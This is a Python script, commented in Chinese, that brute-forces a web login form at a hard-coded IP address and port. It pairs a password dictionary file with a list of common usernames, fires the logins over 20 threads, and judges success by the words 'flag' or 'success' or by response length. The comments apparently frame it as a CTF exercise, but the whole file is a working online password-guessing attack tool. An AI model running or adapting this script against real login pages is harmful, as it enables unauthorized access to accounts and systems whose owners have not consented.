#!/usr/bin/env python3
"""
Web登录暴力破解脚本
目标：http://47.113.178.182:32822/
"""

import requests
import concurrent.futures
from itertools import product
import sys

# 目标URL
target_url = "http://47.113.178.182:32822/"

# 读取密码字典
with open('password.txt', 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

# 常见用户名列表（CTF常用）
usernames = [
    'admin', 'administrator', 'root', 'user', 'test', 'guest',
    'manager', 'webadmin', 'sysadmin', 'operator', 'master',
    'owner', 'superuser', 'support', 'backup', 'demo',
    # 可能的变体
    'Admin', 'ADMIN', 'admin123', 'admin888',
    # 单个字母/数字
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'
]

print(f"""
╔══════════════════════════════════════════════════════════╗
║         Web 登录暴力破解工具                             ║
║         目标: {target_url}                  ║
╚══════════════════════════════════════════════════════════╝

[*] 用户名数量: {len(usernames)}
[*] 密码数量: {len(passwords)}
[*] 总组合数: {len(usernames) * len(passwords)}
[*] 开始爆破...
""")

# 成功标志
success_found = False
success_info = None

def try_login(username, password):
    """尝试登录"""
    global success_found, success_info

    if success_found:
        return None

    try:
        data = {
            'username': username,
            'password': password
        }

        response = requests.post(target_url, data=data, timeout=5)

        # 检查是否登录成功（不包含"错误"字样）
        if '错误' not in response.text and '失败' not in response.text:
            # 可能成功，检查是否包含flag或其他成功标志
            if 'flag' in response.text.lower() or 'success' in response.text.lower() or '成功' in response.text:
                success_found = True
                success_info = {
                    'username': username,
                    'password': password,
                    'response': response.text
                }
                return success_info
            elif len(response.text) > 50:  # 响应内容较长，可能是成功页面
                success_found = True
                success_info = {
                    'username': username,
                    'password': password,
                    'response': response.text
                }
                return success_info

        # 显示进度
        return None

    except Exception as e:
        return None

# 使用线程池进行暴力破解
counter = 0
total = len(usernames) * len(passwords)

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    # 创建所有任务
    futures = []
    for username, password in product(usernames, passwords):
        future = executor.submit(try_login, username, password)
        futures.append((future, username, password))

    # 处理结果
    for future, username, password in futures:
        counter += 1

        if success_found:
            # 取消剩余任务
            executor.shutdown(wait=False, cancel_futures=True)
            break

        result = future.result()

        # 每100次尝试显示一次进度
        if counter % 100 == 0:
            print(f"[*] 进度: {counter}/{total} ({counter*100//total}%)")

        if result:
            print(f"\n{'='*70}")
            print(f"[+] 登录成功!")
            print(f"[+] 用户名: {result['username']}")
            print(f"[+] 密码: {result['password']}")
            print(f"{'='*70}")
            print(f"\n[响应内容]")
            print(result['response'])
            print(f"\n{'='*70}")
            break

if not success_found:
    print("\n[!] 爆破完成，未找到正确凭证")
    print("[*] 建议:")
    print("    1. 检查用户名列表是否完整")
    print("    2. 尝试使用其他密码字典")
    print("    3. 查看网站是否有其他登录入口")
